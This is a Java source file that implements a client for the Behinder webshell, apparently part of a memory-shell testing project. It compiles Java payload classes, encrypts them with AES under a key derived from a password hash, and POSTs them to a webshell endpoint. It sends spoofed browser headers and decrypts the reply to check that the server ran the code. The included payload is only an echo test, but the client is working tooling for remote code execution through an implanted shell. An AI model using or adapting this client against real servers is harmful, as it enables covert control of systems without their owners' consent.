package com.reajason.javaweb.behinder;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;
import com.reajason.javaweb.behinder.payloads.Test;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.ClassFileVersion;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
@Data
@AllArgsConstructor
public class BehinderManager {
    private final OkHttpClient client;
    private String cookie = "";
    private String entrypoint;
    private String pass;
    private String md5Key;
    private Request request;
    private Map<String, String> headers = new HashMap<>();

    public BehinderManager() {
        this.client = new OkHttpClient.Builder().build();
    }

    @SneakyThrows
    public boolean test() {
        byte[] bytes = new ByteBuddy(ClassFileVersion.JAVA_V6).redefine(Test.class)
                .name(Utils.getRandomClassName())
                .visit(new TargetJreVersionVisitorWrapper(Opcodes.V1_6))
                .make().getBytes();
        String param = "xixi";
        Map<String, Object> resultObj = post(bytes);
        JSONObject expectedSuccessObj = new JSONObject();
        expectedSuccessObj.put("status", java.util.Base64.getEncoder().encodeToString("success".getBytes()));
        expectedSuccessObj.put("msg", java.util.Base64.getEncoder().encodeToString(param.getBytes()));
        String expectedSuccessBody = expectedSuccessObj.toString();
        byte[] expectedSuccessBodyBytes = encrypt(expectedSuccessBody.getBytes());
        byte[] resData = Base64.decodeBase64((byte[]) resultObj.get("data"));
        int beginIndex = indexOf(resData, expectedSuccessBodyBytes);
        int endIndex = resData.length - (beginIndex + expectedSuccessBodyBytes.length);
        endIndex = beginIndex == -1 ? -1 : endIndex;
        if (beginIndex > 0 || endIndex > 0) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }
        String resText = new String(decrypt(resData));
        if (StringUtils.isBlank(resText)) {
            throw new RuntimeException("decrypt text is empty, the raw data is " + new String((byte[]) resultObj.get("data")) + " and the status code is " + resultObj.get("status"));
        }
        JSONObject jsonObject = JSON.parseObject(resText);
        String msg = new String(Base64.decodeBase64(jsonObject.getString("msg")));
        if (!param.equals(msg)) {
            throw new RuntimeException(msg + " not equals to xixi, and status code is " + resultObj.get("status"));
        }
        return true;
    }

    public Map<String, Object> post(byte[] bytes) throws IOException {
        byte[] aes = encrypt(bytes);
        RequestBody requestBody = RequestBody.create(Base64.encodeBase64(aes));
        Request.Builder builder = new Request.Builder()
                .url(this.entrypoint)
                .post(requestBody)
                .headers(Headers.of(this.headers));
        if (StringUtils.isNotBlank(cookie)) {
            builder.header("Cookie", cookie);
        }
        Map<String, Object> map = new HashMap<>(3);
        try (Response response = client.newCall(builder.build()).execute()) {
            map.put("status", response.code());
            byte[] bytes1 = response.body().bytes();
            map.put("data", bytes1);
            map.put("headers", response.headers());
        }
        return map;
    }

    private byte[] encrypt(byte[] bytes) throws IOException {
        return aes(this.md5Key, bytes, true);
    }

    private byte[] decrypt(byte[] bytes) throws IOException {
        return aes(this.md5Key, bytes, false);
    }


    /**
     * AES 加解密
     *
     * @param bytes    加解密的字符串字节数组
     * @param encoding 是否为加密，true 为加密，false 解密
     * @return 返回加解密后的字节数组
     */
    public static byte[] aes(String key, byte[] bytes, boolean encoding) {
        try {
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(encoding ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(bytes);
        } catch (Exception e) {
            return new byte[0];
        }
    }

    public static int indexOf(byte[] outerArray, byte[] smallerArray) {
        for (int i = 0; i < outerArray.length - smallerArray.length + 1; ++i) {
            boolean found = true;

            for (int j = 0; j < smallerArray.length; ++j) {
                if (outerArray[i + j] != smallerArray[j]) {
                    found = false;
                    break;
                }
            }

            if (found) {
                return i;
            }
        }

        return -1;
    }

    public static BehinderManager.BehinderManagerBuilder builder() {
        return new BehinderManager.BehinderManagerBuilder();
    }

    public static class BehinderManagerBuilder {
        private final Map<String, String> headers = new HashMap<>();
        private String entrypoint;
        private String pass;

        public BehinderManager.BehinderManagerBuilder entrypoint(String entrypoint) {
            this.entrypoint = entrypoint;
            return this;
        }

        public BehinderManager.BehinderManagerBuilder pass(String pass) {
            this.pass = pass;
            return this;
        }

        public BehinderManager.BehinderManagerBuilder header(String key, String value) {
            this.headers.put(key, value);
            return this;
        }

        public BehinderManager build() {
            BehinderManager manager = new BehinderManager();
            manager.setPass(pass);
            manager.setEntrypoint(entrypoint);
            manager.setMd5Key(DigestUtils.md5Hex(pass).substring(0, 16));
            Map<String, String> headers = new HashMap<>(16);
            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
            headers.put("Referer", entrypoint);
            headers.putAll(this.headers);
            manager.setHeaders(headers);
            return manager;
        }
    }
}
